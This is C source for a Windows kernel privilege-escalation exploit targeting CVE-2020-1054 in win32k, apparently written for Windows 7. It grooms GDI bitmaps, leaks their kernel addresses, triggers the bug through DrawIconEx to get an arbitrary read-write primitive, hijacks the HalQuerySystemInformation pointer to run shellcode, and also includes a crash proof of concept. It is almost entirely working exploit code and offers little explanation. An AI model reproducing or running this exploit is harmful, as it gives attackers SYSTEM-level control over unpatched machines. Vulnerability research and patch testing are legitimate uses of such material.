#include "CVE-2020-1054.h"

BOOL Exploit_CVE_2020_1054()
{
	BOOL bRet = TRUE;

	if (!LoadLibrary("user32.dll"))
	{
		bRet = FALSE;
		ShowError("LoadLibrary", GetLastError());
		goto exit;
	}

	HDC hdc = NULL;
	hdc = CreateCompatibleDC(NULL);
	if (!hdc)
	{
		bRet = FALSE;
		ShowError("CreateCompatibleDC", GetLastError());
		goto exit;
	}

	HBITMAP hExpBitMap = NULL;

	hExpBitMap = CreateCompatibleBitmap(hdc, 0x51500, 0x100);
	if (!hExpBitMap)
	{
		bRet = FALSE;
		ShowError("CreateCompatibleBitmap", GetLastError());
		goto exit;
	}

	ULONG64 ulExpBitMap = GetBitMapKerAddr(hExpBitMap);
	ULONG64 oob_target = (ulExpBitMap & 0xfffffffffff00000) + 0x0000000100000000;

	HBITMAP hManager = NULL, hWorker = NULL;
	ULONG64 ulManager = 0, ulWorker = 0;

	while (true)
	{
		HBITMAP hBitMap = NULL;

		hBitMap = CreateCompatibleBitmap(hdc, 0x6F000, 0x8);
		if (!hBitMap)
		{
			bRet = FALSE;
			ShowError("CreateCompatibleBitmap", GetLastError());
			goto exit;
		}

		ULONG64 ulBitMapKerAddr = GetBitMapKerAddr(hBitMap);

		if (hManager)
		{
			ulWorker = ulBitMapKerAddr;
			hWorker = hBitMap;
			break;
		}
		else if (ulBitMapKerAddr >= oob_target && (ulBitMapKerAddr & 0x0000000000070000) == 0x70000)
		{
			ulManager = ulBitMapKerAddr;
			hManager = hBitMap;
		}
	}

	// ´¥·¢Â©¶´£¬ÐÞ¸ÄhMangerµÄ¿É¶ÁÐ´·¶Î§
	SelectObject(hdc, hExpBitMap);
	DrawIconEx(hdc, 0x900, 0xb, (HICON)0x40000010003, 0x0, 0xffe00000, 0x0, 0x0, 0x1);

	ULONG64 ulSize = ulWorker + 0x50 - (ulManager + 0x238);
	if (!EnablePrivilege_CVE_2020_1054(hManager, hWorker, ulSize))
	{
		bRet = FALSE;
		goto exit;
	}

exit:
	return bRet;
}

BOOL EnablePrivilege_CVE_2020_1054(HBITMAP hManager, HBITMAP hWorker, ULONG64 ulSize)
{
	BOOL bRet = TRUE;
	PVOID pBuf = NULL;

	pBuf = malloc(ulSize + 0x10);
	if (!pBuf)
	{
		bRet = FALSE;
		ShowError("malloc", GetLastError());
		goto exit;
	}
	ZeroMemory(pBuf, ulSize + 0x10);
	
	if (!GetBitmapBits(hManager, ulSize, pBuf))
	{
		bRet = FALSE;
		ShowError("GetBitmapBits", GetLastError());
		goto exit;
	}

	ULONG64 ulHalQuerySystenInformation = (ULONG64)GetHalQuerySystemInformation();
	if (!ulHalQuerySystenInformation)
	{
		bRet = FALSE;
		goto exit;
	}

	*(PULONG64)((ULONG64)pBuf + ulSize) = ulHalQuerySystenInformation;
	if (!SetBitmapBits(hManager, ulSize + sizeof(ULONG64), pBuf))
	{
		bRet = FALSE;
		ShowError("SetBitmapBits", GetLastError());
		goto exit;
	}

	ULONG64 ulOrg = 0;

	if (!GetBitmapBits(hWorker, sizeof(ULONG64), &ulOrg))
	{
		bRet = FALSE;
		ShowError("GetBitmapBits", GetLastError());
		goto exit;
	}

	ULONG64 ulShellCode = (ULONG64)ShellCodeInWin7;
	if (!SetBitmapBits(hWorker, sizeof(ULONG64), &ulShellCode))
	{
		bRet = FALSE;
		ShowError("GetBitmapBits", GetLastError());
		goto exit;
	}

	if (!CallNtQueryIntervalProfile())
	{
		bRet = FALSE;
		goto exit;
	}

	if (!SetBitmapBits(hWorker, sizeof(ULONG64), &ulOrg))
	{
		bRet = FALSE;
		ShowError("GetBitmapBits", GetLastError());
		goto exit;
	}

exit:
	return bRet;
}

ULONG64 GetBitMapKerAddr(HBITMAP hBitMap)
{
	ULONG64 pKernelAddress = NULL;
	ULONG64 ulPEB = GetPEB();
	ULONG64 ulGdiSharedHandleTable = *(PULONG64)(ulPEB + 0xF8);

	pKernelAddress = *(PULONG64)(ulGdiSharedHandleTable + sizeof(HANDLEENTRY) * ((ULONG64)hBitMap & 0xFFFF));

	return pKernelAddress;
}

VOID POC_CVE_2020_1054()
{
	LoadLibrary("user32.dll");
	HDC r0 = CreateCompatibleDC(0x0);
	// CPR's original crash code called CreateCompatibleBitmap as follows
	// HBITMAP r1 = CreateCompatibleBitmap(r0, 0x9f42, 0xa);
	// however all following calculations/reversing in this blog will
	// generally use the below call, unless stated otherwise
	// this only matters if you happen to be following along with WinDbg
	HBITMAP r1 = CreateCompatibleBitmap(r0, 0x51500, 0x100);
	SelectObject(r0, r1);
	DrawIconEx(r0, 0x0, 0x0, (HICON)0x30000010003, 0x0, 0xfffffffffebffffc,
				0x0, 0x0, 0x6);
}